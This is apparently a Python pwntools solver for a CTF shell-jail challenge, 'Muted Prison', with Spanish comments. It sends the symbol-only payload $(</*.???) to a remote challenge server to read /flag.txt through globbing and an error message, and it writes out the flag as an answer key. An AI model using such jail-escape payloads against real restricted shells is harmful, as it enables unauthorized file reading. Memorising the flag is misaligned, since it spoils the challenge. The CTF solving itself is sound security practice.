#!/usr/bin/env python3
# solve.py — Muted Prison solver
# Jail que solo permite símbolos, sin letras ni números

from pwn import *

context.log_level = 'info'

def solve():
    p = remote('0.cloud.chals.io', 17672)

    # $(</*.???) lee /flag.txt usando solo símbolos
    # /*.??? matchea /flag.txt (barra + 4 chars + punto + 3 chars)
    p.sendlineafter(b'>> ', b'$(</*.???)')

    response = p.recvall(timeout=2).decode()
    print(response)

    # La flag aparece en el error "command not found"
    # HackOn{ni_m4dur0_esc4p4_d3_3st4}

if __name__ == "__main__":
    solve()
